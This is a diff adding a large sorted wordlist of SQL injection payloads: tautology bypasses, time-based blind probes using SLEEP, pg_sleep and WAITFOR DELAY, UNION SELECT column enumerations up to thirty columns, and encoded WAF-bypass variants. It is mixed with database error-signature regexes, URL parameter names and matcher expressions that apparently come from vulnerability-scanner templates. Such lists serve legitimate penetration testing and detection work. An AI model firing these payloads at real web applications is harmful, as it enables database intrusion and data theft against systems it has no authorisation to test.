@@ -1,0 +1,2283 @@
+"
+" OR "1"="1
+" OR "1"="1"#
+" OR "1"="1"--
+" OR "1"="1"/*
+" OR 1=1
+" OR 1=1 --
+" OR 1=1#
+" OR 1=1--
+" OR 1=1/*
+" OR 1=1;#
+" OR 1=1;--
+" OR 1=1;/*
+" OR TRUE--
+") OR "1"="1
+") OR "1"="1"#
+") OR "1"="1"--
+") OR "1"="1"/*
+") OR ("1"="1
+") OR ("1"="1"#
+") OR ("1"="1"--
+") OR ("1"="1"/*
+"or""=""or""="
+"params=&isAction=2&cycle_id=2 AND 3959=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(118)||CHR(122)||CHR(105),5)"
+# Polyglots
+# WAF Bypass & Encoding
+%27%20OR%201%3D1--
+&& !contains(body_3,'a283e9d11ea180bc7a360e9f1a833e51')
+&& contains(body_2,"tb_label_title_text")
+'
+' #
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT 1 FROM (SELECT(pg_sleep(5)))a)--
+' AND 1=(SELECT COUNT(*) FROM tablename)--
+' AND 1=1--
+' AND 1=2--
+' GROUP BY 1,2,3--
+' OR '1'='1
+' OR '1'='1' { % / * / }
+' OR 'a'='a
+' OR 'a'='b
+' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)='
+' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)='1
+' OR 1=1 --
+' OR 1=1 LIMIT 1
+' OR 1=1 LIMIT 1 OFFSET 1--
+' OR 1=1 LIMIT 1--
+' OR 1=1#
+' OR 1=1--
+' OR 1=1/*
+' OR 1=1;#
+' OR 1=1;--
+' OR 1=1;/*
+' OR TRUE--
+' ORDER BY 1--
+' ORDER BY 10--
+' ORDER BY 2--
+' UNION SELECT 1,2,3--
+' UNION SELECT @@VERSION,2,3--
+' UNION SELECT NULL FROM DUAL--
+' UNION SELECT NULL,NULL FROM DUAL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL--
+' UNION SELECT version(),2,3--
+'#
+''UpdateCategoryList'')}}'
+') OR '1'='1
+') OR '1'='1'#
+') OR '1'='1'--
+') OR '1'='1'/*
+') OR ('1'='1
+') OR ('1'='1'#
+') OR ('1'='1'--
+') OR ('1'='1'/*
+'); SELECT PG_SLEEP(5)--
+'); WAITFOR DELAY '0:0:5'--
+'--
+'-- -
+'/*
+'/**/OR/**/1=1--
+'OR%091=1--
+'OR%0a1=1--
+'OR%0b1=1--
+'OR%0c1=1--
+'OR%0d1=1--
+'OR%a01=1--
+(SELECT 8544 FROM (SELECT (SLEEP(5-(IF(27=27,0,5)))))NZeo)
+(select concat(0x7e,0x27,unhex(hex(md5(3.1415))),0x27,0x7e)) from information_schema.tables
+-  "-- \""
+- " "
+- " /*f*/OR/*f*/pg_sleep(70)#"
+- " /*f*/OR/*f*/pg_sleep(70)%23"
+- " /*f*/OR/*f*/pg_sleep(70)--+-"
+- " OR(if(now()=sysdate(),sleep(7),0))#"
+- " OR(if(now()=sysdate(),sleep(7),0))%23"
+- " OR(if(now()=sysdate(),sleep(7),0))--+-"
+- " WAITFOR DELAY '0:0:7'#"
+- " WAITFOR DELAY '0:0:7'%23"
+- " WAITFOR DELAY '0:0:7'--+-"
+- " WHERE {{randomnum1}}={{randomnum1}} "
+- " XOR(if(now()=sysdate(),sleep(7),0))XOR%23"
+- " or sleep(7)#"
+- " or sleep(7)%23"
+- " or sleep(7)--+-"
+- " or/*f*/sleep/*f*/(7)#"
+- " or/*f*/sleep/*f*/(7)%23"
+- " or/*f*/sleep/*f*/(7)--+-"
+- "![0-9]{5}![^\\n]+(failed|unexpected|error|syntax|expected|violation|exception)"
+- ""
+- "# {{randomstr1}}"
+- "#"
+- "%'"
+- "%22"
+- "%22%22|0;#"
+- "%28select%2Afrom%28select%28sleep%287%29%29a%29"
+- "%3B(select%201%20from%20pg_sleep(7))"
+- "%3Bwaitfor%20delay%20%270%3A0%3A7%27%2D%2D"
+- "%7C%7C(select%201%20from%20pg_sleep(7))"
+- "%E2%84%A2%22"
+- "%E2%84%A2%22/*F*/or/*f*/pg_sleep(7)%23"
+- "%E2%84%A2%22/*F*/or/*f*/sleep(7)%23"
+- "%E2%84%A2%22/*F*/or/*f*/sleep(7)--+-"
+- "%E2%84%A2%27"
+- "%E2%84%A2%27)/*F*/or/*f*/sleep(7)--+-"
+- "%E2%84%A2%27/*F*/or/*f*/pg_sleep(7)%23"
+- "%E2%84%A2%27/*F*/or/*f*/sleep(7)%23"
+- "%E2%84%A2')/*F*/or/*f*/sleep(7)='"
+- "%E2%84%A2'/*F*/or/*f*/sleep(7)='"
+- "%E2%84%A2\")/*F*/or/*f*/sleep(7)--+-"
+- "&lt;REGEX_LITERAL&gt;"
+- "' "
+- "' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))HoBG)--"
+- "' OR ''='"
+- "' OR '1'='1"
+- "' OR '1'='1'--"
+- "' OR 'a'='a"
+- "' OR 1=1#"
+- "' OR 1=1--"
+- "' WHERE {{randomnum1}}={{randomnum1}} "
+- "' or sleep(7)#"
+- "' or sleep(7)%23"
+- "' or sleep(7)-- -#"
+- "' or sleep(7)-- -%23"
+- "' or sleep(7);%00"
+- "' or sleep(7)='#"
+- "' or sleep(7)='--"
+- "'"
+- "') "
+- "') AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+- "')) "
+- "')) AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+- "'))) "
+- "'+(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+- "'/*F*/or/*F*/sleep(7)='"
+- "'/*f*/OR/*f*/pg_sleep(7)#"
+- "'/*f*/OR/*f*/pg_sleep(7)%23"
+- "'/*f*/OR/*f*/pg_sleep(7);%00"
+- "'/*f*/OR/*f*/pg_sleep(7)=';%00"
+- "'/*f*/or/*f*/sleep/*f*/(7)#"
+- "'/*f*/or/*f*/sleep/*f*/(7)%23"
+- "'/*f*/or/*f*/sleep/*f*/(7)-- -#"
+- "'/*f*/or/*f*/sleep/*f*/(7)-- -%23"
+- "'/*f*/or/*f*/sleep/*f*/(7);%00"
+- "'OR(if(now()=sysdate(),sleep(7),0))#"
+- "'OR(if(now()=sysdate(),sleep(7),0))%23"
+- "'OR(if(now()=sysdate(),sleep(7),0))-- -#"
+- "'OR(if(now()=sysdate(),sleep(7),0))-- -%23"
+- "'OR(if(now()=sysdate(),sleep(7),0));%00"
+- "'WAITFOR DELAY '0:0:7'#"
+- "'WAITFOR DELAY '0:0:7'%23"
+- "'WAITFOR DELAY '0:0:7'--+-"
+- "'WAITFOR DELAY '0:0:7';%00"
+- "'WAITFOR DELAY '0:0:7'='"
+- "'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(7) ELSE 0 END)XOR'Z"
+- "'XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z"
+- "'XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z"
+- "'XOR(if(now()=sysdate(),sleep(7),0))XOR'"
+- "'||(SELECT '{{randomstr1}}' FROM DUAL WHERE {{randomnum1}}={{randomnum1}} "
+- "'||(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+- "((Microsoft|System).Data.SQLite.SQLiteException|Warning.*?(sqlite_|SQLite3)|SQLITE_ERROR|SQLite error)"
+- "(?i)(\\?|\\&|\\/)(((([a-z0-9-_])+(-|_)+))|(-|_))?(id|select|report|client|role|update|query|username|user|name|sort|where|params|process|row|view|table|from|sel|results|sleep|fetch|order|keyword|column|field|delete|string|number|filter|cat)((=)|(\\/[0-9]+\\/?))"
+- "(?i)(sql syntax error|unclosed quotation mark|ORA-01756|SQLSTATE|Warning: mysql|Warning: mysqli|You have an error in your SQL syntax|PostgreSQL query failed|unterminated quoted string)"
+- "(?i)(sql syntax|mysql syntax|unexpected token)"
+- "(?i)Warning.*sybase.*|Sybase message|Sybase.*Server message.*"
+- "(?m)Stable tag: ([0-9.]+)"
+- "(?s)Exception.*?\\bRoadhouse\\.Cms\\."
+- "(Access Database Engine|ODBC Microsoft Access|Syntax error .*?missing operator.*? in query expression|Driver.*? SQL.*? Server)"
+- "(ERROR.*?syntax error at or near|ERROR.*? parser.*? parse error at or near|PostgreSQL query failed|org.postgresql.jdbc)"
+- "(Exception.*?Roadhouse.Cms.|Microsoft SQL Native Client error |ODBC SQL Server Driver|ODBC Driver.*? for SQL Server)"
+- "(Microsoft|System)\\.Data\\.SQLite\\.SQLiteException"
+- "(MySQLSyntaxErrorException|valid MySQL result|check the manual that corresponds to your (MySQL|MariaDB) server version)"
+- "(MySqlException|ORA-{5}|Oracle error|Oracle.*?Driver|Warning.*?(oci|ora)_|quoted string not properly terminated)"
+- "(ODBC Informix driver|com.informix.jdbc|weblogic.jdbc.informix|IfxException|Warning.*?ingres_|Ingres SQLSTATE|Ingres.*?Driver)"
+- "(OLE DB.*? SQL Server|bSQL Server.*? Driver|Warning.*?(mssql|sqlsrv)_|SQL Server|System.Data.SqlClient.SqlException)"
+- "(OracleException|PostgreSQL.*?ERROR|Warning.*?pg|valid PostgreSQL result|Npgsql|PG.*?SyntaxError|org.postgresql.util.PSQLException)"
+- "(PSQLException|SQL error.*?POS|Warning.*?maxdb|DriverSapDB|com.sap.dbtech.jdbc|SQLite.*?JDBCDriver|SQLite.Exception)"
+- "(SELECT(0)FROM(SELECT(SLEEP(7)))a)"
+- "(SELECT(0)FROM(SELECT(SLEEP({{randomtime}})))a)"
+- "(SQL command not properly ended|macromedia.jdbc.oracle|oracle.jdbc|Zend_Db_(Adapter|Statement)_Oracle_Exception)"
+- "(SQLServer JDBC Driver|com.jnetdirect.jsql|macromedia.jdbc.sqlserver|Zend_Db_(Adapter|Statement)_Sqlsrv_Exception)"
+- "(Semantic|Syntax) error [1-4]\\d{2}\\."
+- "(Semantic|Syntax) error \\[1-4\\]\\d{2}\\."
+- "(Sybase message|Sybase.*?Server message|SybSQLException|Sybase.Data.AseClient|com.sybase.jdbc)"
+- "(Transaction rollback|com.frontbase.jdbc|org.h2.jdbc|Unexpected end of command in statement|Unexpected token.*?in statement)"
+- "(Unknown column .*? in .field list.|MySqlClient.|com.mysql.jdbc|Zend_Db_(Adapter|Statement)_Mysqli_Exception)"
+- "(Zend_Db_(Adapter|Statement)_Db2_Exception|DB2Exception|Warning.*?ifx_|Exception.*?Informix|Informix ODBC Driver)"
+- "(\\/[0-9]+\\/)"
+- "(com.ingres.gcf.jdbc|Dynamic SQL Error|Warning.*?ibase_|org.firebirdsql.jdbc|Microsoft Access.*?Driver|JET Database Engine)"
+- "(com.microsoft.sqlserver.jdbc|(Mssql|SqlSrv)|SQL(Srv|Server)Exception|SQL syntax.*?MySQL|Warning.*?mysqli?_)"
+- "(duration_1>=3 && duration_1<=5) && (duration_2>=6 && duration_2<=8) && (duration_3>=9 && duration_3<=12)"
+- "(d|D)(a|A)(t|T)(a|A)(b|B)(a|A)(s|S)(e|E)"
+- "(org.hsqldb.jdbc|CLI Driver.*?DB2|DB2 SQL error|bdb2_w+|SQLSTATE.+SQLCODE|com.ibm.db2.jcc)"
+- "(select*from(select(sleep(7)))a)"
+- "(sqlite3.OperationalError:|SQLite3.*?SQLException|org.sqlite.JDBC|Sqlite|SQLiteException|Warning.*?sybase_)"
+- "(s|S)(q|Q)(l|L)"
+- ") "
+- ") AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+- ")) "
+- ")) AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+- "))) "
+- ")+"
+- ")+'"
+- ")||'"
+- "+(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+- "+(SELECT {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+- ", Sqlstate: (3F|42).{3}, (Routine|Hint|Position):"
+- "-- -"
+- "-- ;"
+- "-- \""
+- "-- {{randomstr1}}"
+- "--"
+- "-1"
+- "-10048: Syntax error"
+- "-3014.*?Invalid end of SQL statement"
+- ".NET Framework"
+- ".hsqldb"
+- ".jdbc"
+- "/') OR 1 = 1 -- ];"
+- "//input[@id='__VIEWSTATE']/@value"
+- "//input[@id='__VIEWSTATEGENERATOR']/@value"
+- "/ReportServer"
+- "/WebReport/ReportServer"
+- "/general/approve_center/list/print"
+- "/module/swfupload/swfupload.swf"
+- "/seeyonreport/ReportServer"
+- "/vertica/Parser/scan"
+- "0b32d6a87c09c32b3cd90dfd5ef5699"
+- "0x06d49632c9dc9bcb62aeaef99612ba6b"
+- "1%20OR%20ELT%28%5B33%5D%3D%5B33%5D%2CSLEEP%28%5B7%5D%29%29"
+- "1+AND+ELT%281337%3D1337%2CSLEEP%287%29%29"
+- "1111123"
+- "1;1"
+- "202cb962ac59075b964b07152d234b7"
+- "202cb962ac59075b964b07152d234b70"
+- "202cb962ac59075b964b07152d234b701"
+- "400"
+- "401"
+- "403 Forbidden"
+- "403"
+- "404"
+- "4386499557"
+- "474088963122"
+- "4beed3b9c4a886067de0e3a094246f781"
+- "500"
+- "503"
+- "504"
+- "52c69e3a57331081823331c4e69d3f2e"
+- "6412121cbb2dc2cb9e460cfee7046be"
+- "65025"
+- "6f7c6dcbc380aac3bcba1f9fccec991e"
+- "707564257851522176"
+- "81dc9bdb52d04dc20036dbd8313ed05"
+- "81dc9bdb52d04dc20036dbd8313ed055"
+- ": '\\ZSL1ZSL'"
+- ":td_oa:1"
+- ";"
+- ";waitfor delay '0:0:7'--"
+- "</code>"
+- "<b>Warning</b>"
+- "<code>"
+- "<div class=\"line2\">(.*?)</div>"
+- "?cat="
+- "?category="
+- "?class="
+- "?date="
+- "?dir="
+- "?file="
+- "?filename="
+- "?form="
+- "?id="
+- "?item="
+- "?join="
+- "?lang="
+- "?main="
+- "?menu="
+- "?name="
+- "?nav="
+- "?news="
+- "?page="
+- "?pid="
+- "?ref="
+- "?region="
+- "?s="
+- "?search="
+- "?search_id="
+- "?thread="
+- "?title="
+- "?topic="
+- "?type="
+- "?url="
+- "?view="
+- "?xml"
+- "A comparison operator is required here"
+- "AND '{{randomchar1}}'='{{randomchar1}}' LIMIT 1"
+- "AND '{{randomchar1}}'='{{randomchar1}}'"
+- "AND '{{randomchar1}}'='{{randomchar2}}' LIMIT 1"
+- "AND '{{randomchar1}}'='{{randomchar2}}'"
+- "AND '{{randomstr1}}%'='{{randomstr1}}"
+- "AND '{{randomstr1}}' LIKE '{{randomstr1}}"
+- "AND '{{randomstr1}}'='{{randomstr1}}"
+- "AND ('{{randomstr1}}' LIKE '{{randomstr1}}"
+- "AND ('{{randomstr1}}'='{{randomstr1}}"
+- "AND (('{{randomstr1}}' LIKE '{{randomstr1}}"
+- "AND (('{{randomstr1}}'='{{randomstr1}}"
+- "AND ((('{{randomstr1}}' LIKE '{{randomstr1}}"
+- "AND ((('{{randomstr1}}'='{{randomstr1}}"
+- "AND (((\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
+- "AND (((\"{{randomstr1}}\"=\"{{randomstr1}}"
+- "AND ((({{randomnum1}}={{randomnum1}}"
+- "AND ((\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
+- "AND ((\"{{randomstr1}}\"=\"{{randomstr1}}"
+- "AND (({{randomnum1}}={{randomnum1}}"
+- "AND (SELECT {{randomnum1}} FROM (SELECT(SLEEP({{randomtime}}))){{randomstr1}})"
+- "AND (\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
+- "AND (\"{{randomstr1}}\"=\"{{randomstr1}}"
+- "AND ({{randomnum1}}={{randomnum1}}"
+- "AND SLEEP({{randomtime}})"
+- "AND \"{{randomstr1}}\" LIKE \"{{randomstr1}}
+- "AND \"{{randomstr1}}\"=\"{{randomstr1}}"
+- "AND {{randomnum1}}={{randomnum1}} LIMIT 1"
+- "AND {{randomnum1}}={{randomnum1}}"
+- "AND {{randomnum1}}={{randomnum2}} LIMIT 1"
+- "AND {{randomnum1}}={{randomnum2}}"
+- "Access Database Engine"
+- "Access Denied"
+- "Admin Dashboard"
+- "Adminer"
+- "Altibase\\.jdbc\\.driver"
+- "An error occurred | array_merge() | valid MySQL result |MySqlClient.|mysqli_.*| SQL syntax.*MySQL|Warning.*mysql_.*"
+- "Banner"
+- "CLI Driver"
+- "CLI Driver.*?DB2"
+- "CLI Driver.*DB2|DB2 SQL error|bdb2_w+"
+- "CREATE TRIGGER"
+- "Cloudflare"
+- "Construtoras"
+- "Content-Type: text/html"
+- "DB2 SQL error"
+- "DB2Exception"
+- "DatabaseException"
+- "DbHelper.CurrentDb"
+- "DbHelperSQL"
+- "Driver.*? SQL[\\-\\_\\ ]*Server"
+- "DriverSapDB"
+- "Dynamic SQL Error"
+- "ERROR 42X01"
+- "ERROR: parser: parse error at or near"
+- "ERROR:\\s\\ssyntax error at or near"
+- "Error 1006"
+- "Error 500"
+- "Error:-Incorrect syntax near"
+- "Event Details Report"
+- "Exception (condition )?\\d+\\. Transaction rollback"
+- "Exception.*?Informix"
+- "Expires: Thu, 01 Jan 1970 00:00:00 GMT"
+- "FR.SessionMgr.register\\('(\\d+)'"
+- "GROUP BY 100"
+- "IfxException"
+- "Informix ODBC Driver"
+- "Ingres SQLSTATE"
+- "Ingres\\W.*?Driver"
+- "Invalid SOAP request"
+- "JET Database Engine"
+- "KNFNvscCyrtqzbxq"
+- "LeagueManager"
+- "Log Helper"
+- "Log out</a>"
+- "Manage Users"
+- "MemSQL does not support this type of query"
+- "Message\":\"245"
+- "Microsoft Access (\\d+ )?Driver"
+- "Microsoft Access Driver|JET Database Engine|Access Database Engine"
+- "Microsoft SQL Native Client error '[0-9a-fA-F]{8}"
+- "Microsoft SQL Server"
+- "Microsoft Windows"
+- "MySQL Error"
+- "MySQL"
+- "MySQLSyntaxErrorException"
+- "MySqlClient\\."
+- "MySqlException"
+- "Npgsql\\."
+- "ODBC Driver \\d+ for SQL Server"
+- "ODBC Informix driver"
+- "ODBC Microsoft Access"
+- "ODBC SQL Server Driver"
+- "OLE DB.*? SQL Server"
+- "OR '{{randomchar1}}'='{{randomchar1}}' LIMIT 1"
+- "OR '{{randomchar1}}'='{{randomchar1}}'"
+- "OR '{{randomchar1}}'='{{randomchar2}}' LIMIT 1"
+- "OR '{{randomchar1}}'='{{randomchar2}}'"
+- "OR '{{randomstr1}}'='{{randomstr2}}
+- "OR SLEEP({{randomtime}})"
+- "OR {{randomnum1}}={{randomnum1}} LIMIT 1"
+- "OR {{randomnum1}}={{randomnum1}}"
+- "OR {{randomnum1}}={{randomnum2}} LIMIT 1"
+- "OR {{randomnum1}}={{randomnum2}}"
+- "ORA-01756"
+- "ORA-[0-9][0-9][0-9][0-9]|Oracle error|Oracle.*Driver|Warning.*Woci_.*|Warning.*Wora_.*"
+- "ORDER BY 100"
+- "Oracle error"
+- "Oracle.*?Driver"
+- "OracleException"
+- "PG::SyntaxError:"
+- "PHP Version"
+- "PHPSESSID="
+- "PSQLException"
+- "Pdo[./_\\\\](Mssql|SqlSrv)"
+- "Pdo[./_\\\\](Oracle|OCI)"
+- "Pdo[./_\\\\]Firebird"
+- "Pdo[./_\\\\]Ibm"
+- "Pdo[./_\\\\]Informix"
+- "Pdo[./_\\\\]Mysql"
+- "Pdo[./_\\\\]Pgsql"
+- "Pdo[./_\\\\]Sqlite"
+- "Plugins</a>"
+- "PostgreSQL query failed"
+- "PostgreSQL.*?ERROR"
+- "PostgreSQL.*ERROR|Warning.*Wpg_.*|valid PostgreSQL resultNpgsql."
+- "Request-Context: appId="
+- "SQ074: Line \\d+:"
+- "SQ200: No table "
+- "SQL check"
+- "SQL command not properly ended"
+- "SQL error"
+- "SQL error.*?POS([0-9]+)"
+- "SQL syntax"
+- "SQL syntax.*?MySQL"
+- "SQL syntax.*MySQL|Warning.*mysql_.*|valid MySQL result|MySqlClient.|mysqli_error|mysqli_query"
+- "SQL"
+- "SQL(Srv|Server)Exception"
+- "SQLCODE"
+- "SQLCODE[=:\\d, -]+SQLSTATE"
+- "SQLITE_ERROR"
+- "SQLSTATE"
+- "SQLSTATE[\\d+]: Syntax error or access violation"
+- "SQLSTATE\\[\\d+\\]: Syntax error or access violation"
+- "SQLServer JDBC Driver"
+- "SQLSyntaxErrorException"
+- "SQLite error \\d+:"
+- "SQLite/JDBCDriver"
+- "SQLite/JDBCDriver|SQLite.Exception|System.Data.SQLite.SQLiteException|Warning.*sqlite_.*|Warning.*SQLite3::|SQLITE_ERROR"
+- "SQLite3"
+- "SQLite3::SQLException"
+- "SQLiteException"
+- "SQLiteManager"
+- "SQLite\\.Exception"
+- "SQL语句:"
+- "SR185: Undefined procedure"
+- "Settings</a>"
+- "Signout"
+- "SqlException"
+- "Sqlite"
+- "SybSQLException"
+- "Sybase message"
+- "Sybase.*?Server message"
+- "Sybase\\.Data\\.AseClient"
+- "Syntax error 1. Missing"
+- "Syntax error \\(missing operator\\) in query expression"
+- "Syntax error"
+- "Syntax error,[^\\n]+assumed to mean"
+- "Syntax error: Encountered"
+- "System.Data.SqlClient.SqlException"
+- "System.Data.SqlClient.SqlException:"
+- "System\\.Data\\.SqlClient\\.SqlException\\.(SqlException|SqlConnection\\.OnError)"
+- "UNION ALL SELECT 1"
+- "UNION ALL SELECT 1,2"
+- "UNION ALL SELECT 1,2,3"
+- "UNION ALL SELECT 1,2,3,4"
+- "UNION ALL SELECT 1,2,3,4,5"
+- "UNION ALL SELECT 1,2,3,4,5,6"
+- "UNION ALL SELECT 1,2,3,4,5,6,7"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29"
+- "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30"
+- "UNION ALL SELECT NULL"
+- "UNION ALL SELECT NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+- "UNION SELECT 1"
+- "UNION SELECT 1,2"
+- "UNION SELECT 1,2,3"
+- "UNION SELECT 1,2,3,4"
+- "UNION SELECT 1,2,3,4,5"
+- "UNION SELECT 1,2,3,4,5,6"
+- "UNION SELECT 1,2,3,4,5,6,7"
+- "UNION SELECT 1,2,3,4,5,6,7,8"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29"
+- "UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30"
+- "UNION SELECT NULL"
+- "UNION SELECT NULL,NULL"
+- "UNION SELECT NULL,NULL,NULL"
